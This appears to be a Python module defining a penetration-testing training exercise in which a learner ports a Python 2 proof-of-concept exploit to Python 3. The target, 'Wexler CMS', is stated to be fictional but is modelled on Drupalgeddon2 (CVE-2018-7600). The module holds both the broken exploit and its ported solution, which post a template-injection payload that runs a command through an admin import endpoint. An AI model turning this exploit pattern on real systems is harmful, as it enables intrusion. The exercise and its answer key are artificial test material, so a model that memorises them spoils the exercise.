"""salvage defect class 1: a proof-of-concept written for Python 2.

The most common single reason a script from a public archive will not start,
and the cheapest to fix once you recognise it. `python2` is not installed on
most current systems, which is the realistic condition: porting is the only
option, not a fallback.

The target and its vulnerability are fictional (crux D7). The defect is not.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python
# Wexler CMS 2.0 - authenticated template import RCE
# Tested on Wexler 2.0.3 / Python 2.7
import urllib
import urllib2
import sys

TARGET = "{{URL}}"
PAYLOAD = "{{tpl.render('id')}}"

def main():
    print "[*] sending template to " + TARGET
    data = urllib.urlencode({"template": PAYLOAD, "name": "report"})
    req = urllib2.Request(TARGET + "/admin/import", data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    resp = urllib2.urlopen(req)
    body = resp.read()
    print "[*] response: " + body
    if "CRUX-LANDED" in body:
        print "[+] landed"
    else:
        print "[-] no"

if __name__ == "__main__":
    main()
'''

SOLUTION = r'''#!/usr/bin/env python3
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"
PAYLOAD = "{{tpl.render('id')}}"

def main():
    print("[*] sending template to " + TARGET)
    data = urllib.parse.urlencode({"template": PAYLOAD,
                                   "name": "report"}).encode()
    req = urllib.request.Request(TARGET + "/admin/import", data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        body = urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    print("[*] response: " + body)
    print("[+] landed" if "CRUX-LANDED" in body else "[-] no")

if __name__ == "__main__":
    main()
'''

SCENARIOS = [
    Scenario(
        id='salvage-py2', track='salvage', tier='verified', order=10,
        title='A proof-of-concept that will not even start',
        waypoint='webatk-versionapp', hone=('python',),
        source='PEN-200 Playbook/04 - Phase 4 - Initial Foothold (Web).md',
        body=SalvageBody(
            brief='Wexler CMS 2.0 is running on the target and its template '
                  'import endpoint executes what it is given. The '
                  'proof-of-concept below is the one the advisory shipped. It '
                  'was written for Python 2, which is not installed here. '
                  'Port it and land it.',
            filename='wexler_import.py',
            cve='CVE-2018-7600', models='Drupal "Drupalgeddon2"',
            real_note=(
                'The public Drupalgeddon2 exploits were written for Python 2; '
                'on a current Kali they will not start until you port them, '
                'exactly like this one.'
            ),
            defects=('Python 2 print statement', 'urllib2',
                     'urlencode returns str, not bytes'),
            route='/admin/import',
            reject_code=400,
            reject_message='template missing or empty',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('POST request', 'method', 'POST',
                            hint='the import endpoint only accepts POST'),
                Requirement('the import endpoint', 'route', '/admin/import',
                            hint='nothing arrived at /admin/import'),
                Requirement('a template parameter', 'form', 'tpl.render',
                            key='template',
                            hint='the template field did not carry the '
                                 'payload'),
            ),
            debrief='Three Python 2 idioms in nine lines: `print` as a '
                    'statement, `urllib2`, and `urlencode` returning a `str` '
                    'where `urlopen` now needs `bytes`. The first one stops '
                    'the file compiling, so you never see the other two until '
                    'it does. **Port the whole script before you run it '
                    'again**, rather than one traceback at a time: they are '
                    'the same fix applied in three places.',
        ),
    ),
]
